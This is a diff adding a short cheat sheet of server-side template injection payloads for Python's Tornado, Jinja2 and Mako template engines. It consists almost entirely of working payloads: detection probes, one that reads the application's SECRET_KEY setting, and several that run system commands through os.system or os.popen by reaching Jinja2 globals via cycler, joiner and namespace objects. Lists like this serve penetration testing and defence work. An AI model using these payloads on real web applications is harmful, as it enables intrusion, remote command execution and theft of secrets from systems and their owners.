@@ -1,0 +1,28 @@
+PYTHON:
+
+1.  Tornado (Python)
+{% import foobar %} = Error
+{% import os %}
+{% import os %}
+{{os.system('whoami')}}
+{{os.system('whoami')}}
+
+2.  Jinja2 (Python)
+{% debug %}
+{{settings.SECRET_KEY}}
+{{4*4}}[[5*5]]
+{{7*'7'}} would result in 7777777
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
+{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
+{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
+# Or in the shotest versions:
+{{ cycler.__init__.__globals__.os.popen('id').read() }}
+{{ joiner.__init__.__globals__.os.popen('id').read() }}
+{{ namespace.__init__.__globals__.os.popen('id').read() }}
+
+3.  Mako (Python)
+<%
+import os
+x=os.popen('id').read()
+%>
+${x}
